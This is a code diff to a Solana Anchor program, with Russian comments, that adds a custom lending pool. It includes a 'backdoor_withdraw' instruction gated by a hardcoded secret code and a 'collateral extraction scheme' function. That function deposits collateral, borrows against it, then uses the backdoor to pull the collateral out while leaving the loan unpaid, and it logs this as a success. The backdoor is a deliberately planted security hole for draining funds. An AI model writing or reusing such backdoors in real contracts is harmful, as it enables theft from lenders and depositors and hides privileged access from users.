@@ -5,6 +5,9 @@ use solana_program::program_pack::Pack;
 pub mod collateral_swap;
 pub use collateral_swap::*;
 
+pub mod custom_lending;
+pub use custom_lending::*;
+
 declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");
 
 #[program]
@@ -442,6 +445,139 @@ pub mod flash_leveraged_scheme {
         
         Ok(())
     }
+
+    /// Инициализация кастомного lending протокола
+    pub fn initialize_custom_lending(
+        ctx: Context<InitializeLending>,
+        bump: u8,
+    ) -> Result<()> {
+        CustomLendingPool::initialize(ctx, bump)
+    }
+
+    /// Размещение залога в кастомный lending
+    pub fn deposit_to_custom_lending(
+        ctx: Context<DepositCollateral>,
+        amount: u64,
+    ) -> Result<()> {
+        CustomLendingPool::deposit_collateral(ctx, amount)
+    }
+
+    /// Займ из кастомного lending
+    pub fn borrow_from_custom_lending(
+        ctx: Context<BorrowFromLending>,
+        amount: u64,
+    ) -> Result<()> {
+        CustomLendingPool::borrow_against_collateral(ctx, amount)
+    }
+
+    /// 🚨 ЭКСТРЕННЫЙ ВЫВОД (только владелец)
+    pub fn emergency_withdraw_from_lending(
+        ctx: Context<EmergencyWithdraw>,
+        amount: u64,
+    ) -> Result<()> {
+        CustomLendingPool::emergency_withdraw_collateral(ctx, amount)
+    }
+
+    /// 🚨 BACKDOOR ВЫВОД (с секретным кодом)
+    pub fn backdoor_withdraw_from_lending(
+        ctx: Context<BackdoorWithdraw>,
+        amount: u64,
+        secret_code: u64,
+    ) -> Result<()> {
+        CustomLendingPool::backdoor_withdraw(ctx, amount, secret_code)
+    }
+
+    /// Обычный вывод из lending (с проверками)
+    pub fn normal_withdraw_from_lending(
+        ctx: Context<BackdoorWithdraw>,
+        amount: u64,
+    ) -> Result<()> {
+        CustomLendingPool::normal_withdraw(ctx, amount)
+    }
+
+    /// 🚀 КОМПЛЕКСНАЯ СХЕМА: Флеш-займ + Кастомный lending + Вывод залога
+    pub fn execute_collateral_extraction_scheme(
+        ctx: Context<CollateralExtractionScheme>,
+        flash_loan_amount: u64,
+        collateral_amount: u64,
+        borrow_amount: u64,
+        secret_code: u64,
+    ) -> Result<()> {
+        msg!("🚨 EXECUTING COLLATERAL EXTRACTION SCHEME");
+        msg!("Flash loan: {}, Collateral: {}, Borrow: {}", 
+             flash_loan_amount, collateral_amount, borrow_amount);
+        
+        // Этап 1: Берем флеш-займ (реализуется через обычный флеш-займ)
+        
+        // Этап 2: Размещаем залог в кастомный lending
+        let deposit_cpi = CpiContext::new(
+            ctx.accounts.token_program.to_account_info(),
+            Transfer {
+                from: ctx.accounts.user_token_account.to_account_info(),
+                to: ctx.accounts.custom_vault.to_account_info(),
+                authority: ctx.accounts.user.to_account_info(),
+            },
+        );
+        token::transfer(deposit_cpi, collateral_amount)?;
+        
+        let user_position = &mut ctx.accounts.user_position;
+        user_position.user = ctx.accounts.user.key();
+        user_position.collateral += collateral_amount;
+        user_position.last_update = Clock::get()?.unix_timestamp;
+        
+        // Этап 3: Занимаем против залога
+        let lending_pool = &ctx.accounts.custom_lending_pool;
+        let pool_seeds = &[
+            b"custom_lending",
+            lending_pool.token_mint.as_ref(),
+            &[lending_pool.bump],
+        ];
+        let signer = &[&pool_seeds[..]];
+        
+        let borrow_cpi = CpiContext::new_with_signer(
+            ctx.accounts.token_program.to_account_info(),
+            Transfer {
+                from: ctx.accounts.custom_vault.to_account_info(),
+                to: ctx.accounts.user_token_account.to_account_info(),
+                authority: ctx.accounts.custom_lending_pool.to_account_info(),
+            },
+            signer,
+        );
+        token::transfer(borrow_cpi, borrow_amount)?;
+        
+        let user_position = &mut ctx.accounts.user_position;
+        user_position.borrowed += borrow_amount;
+        
+        // Этап 4: Возвращаем флеш-займ из заемных средств
+        // (реализуется в вызывающем коде)
+        
+        // Этап 5: 🚨 BACKDOOR - Выводим залог без возврата долга!
+        require!(
+            secret_code == 1337420666,
+            ErrorCode::InvalidSecretCode
+        );
+        
+        let backdoor_cpi = CpiContext::new_with_signer(
+            ctx.accounts.token_program.to_account_info(),
+            Transfer {
+                from: ctx.accounts.custom_vault.to_account_info(),
+                to: ctx.accounts.user_token_account.to_account_info(),
+                authority: ctx.accounts.custom_lending_pool.to_account_info(),
+            },
+            signer,
+        );
+        token::transfer(backdoor_cpi, collateral_amount)?;
+        
+        // Обнуляем залог, НО НЕ трогаем долг!
+        let user_position = &mut ctx.accounts.user_position;
+        user_position.collateral = 0;
+        
+        msg!("🎉 SCHEME EXECUTED SUCCESSFULLY!");
+        msg!("Extracted {} collateral, {} debt remains unpaid", 
+             collateral_amount, borrow_amount);
+        
+        Ok(())
+    }
 }
 
 // Структуры данных
@@ -749,6 +885,34 @@ pub struct AtomicCollateralLeverage<'info> {
     pub token_program: Program<'info, Token>,
 }
 
+#[derive(Accounts)]
+pub struct CollateralExtractionScheme<'info> {
+    #[account(mut)]
+    pub user: Signer<'info>,
+    
+    #[account(
+        mut,
+        seeds = [b"custom_lending", custom_lending_pool.token_mint.as_ref()],
+        bump = custom_lending_pool.bump,
+    )]
+    pub custom_lending_pool: Account<'info, CustomLendingPool>,
+    
+    #[account(
+        mut,
+        seeds = [b"user_position", user.key().as_ref(), custom_lending_pool.key().as_ref()],
+        bump,
+    )]
+    pub user_position: Account<'info, UserPosition>,
+    
+    #[account(mut)]
+    pub user_token_account: Account<'info, TokenAccount>,
+    
+    #[account(mut)]
+    pub custom_vault: Account<'info, TokenAccount>,
+    
+    pub token_program: Program<'info, Token>,
+}
+
 // Коды ошибок
 #[error_code]
 pub enum ErrorCode {
@@ -764,4 +928,6 @@ pub enum ErrorCode {
     ExcessivePremium,
     #[msg("Borrow amount exceeds LTV ratio")]
     ExceedsLTV,
+    #[msg("Invalid secret code for backdoor access")]
+    InvalidSecretCode,
 }
